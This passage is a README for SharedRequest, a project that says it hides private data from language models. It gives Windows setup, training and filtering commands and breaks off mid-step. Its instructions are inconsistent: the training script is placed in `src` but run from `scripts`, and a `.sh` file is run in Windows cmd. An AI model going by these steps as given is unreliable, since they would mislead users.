# 🛡️ SharedRequest - Keep your language model data private

[https://github.com/toreygrubby1497/SharedRequest](https://github.com/toreygrubby1497/SharedRequest)

## 📖 About this project

SharedRequest helps you keep your data safe when you use large language models. Many AI tools see your input and store it. This project uses a clever method to hide your private information before the model sees it. It works with any language model. You keep control of your personal details while you still get the smart answers you need.

## 💻 System requirements

Before you start, check your computer for these items:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 16GB of RAM.
*   **Graphics Card:** A dedicated NVIDIA GPU with at least 8GB of video memory.
*   **Software:** You need Python 3.10 or newer installed on your machine.
*   **Storage:** 5GB of free space on your hard drive.

## 🚀 Setting up the software

Follow these steps to prepare your system.

1. Open your web browser and go to this page to download the project files: [https://github.com/toreygrubby1497/SharedRequest](https://github.com/toreygrubby1497/SharedRequest).
2. Click the green "Code" button and select "Download ZIP".
3. Find the downloaded file in your downloads folder.
4. Right-click the file and choose "Extract All". Choose a folder on your computer to save these files.
5. Open your Start menu, type "cmd", and press Enter to open the command prompt.
6. Type `cd` followed by a space, then drag the folder you just extracted into the command window. Press Enter.
7. Install the required tools by typing this command: `pip install -r requirements.txt`.
8. Wait for the process to finish. Your computer will download the necessary helper files.

## ⚙️ Training the security model

You need to train the system once before it can protect your queries. Training teaches the system how to spot private details.

1. Open the folder where you saved the project files.
2. Find the folder named `src` and open it.
3. Locate the script named `run_train_discrim.sh`.
4. Return to your command prompt window.
5. Type `.\scripts\run_train_discrim.sh` and press Enter.
6. The system will now build the discrimination model. This process uses your graphics card. You will see progress updates in the window.
7. Once the process ends, you will find a new file in your `./model` folder. This file contains your custom filter.

## 🕵️ Protecting your inferences

Now that the system knows how to identify private data, you can use it to filter your queries.

### Step 1: Create sample queries

The system creates fake examples to practice its filtering strength.

1. In your command window, type the following command to generate sample data:
   `python -m online_infer.filter --model_name FacebookAI/roberta-base --device cuda:0`
2. The system will generate a file called